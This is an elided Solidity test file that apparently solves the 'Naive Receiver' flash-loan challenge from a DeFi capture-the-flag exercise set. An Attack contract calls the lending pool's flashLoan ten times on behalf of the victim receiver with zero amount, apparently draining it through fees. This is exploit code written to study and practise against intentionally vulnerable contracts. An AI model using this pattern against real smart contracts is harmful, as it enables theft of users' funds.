...
contract NaiveReceiver is Test {
    ...
    function testExploit() public {
        ...
        // );
        //
        // flashLoanReceiver.receiveEther{value: 10}(1e18);
        Attack atk = new Attack(payable(naiveReceiverLenderPool), payable(flashLoanReceiver));
        atk.atk();
...
contract Attack {
    ...
    function atk() public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 0 ether);
        }
    }
}
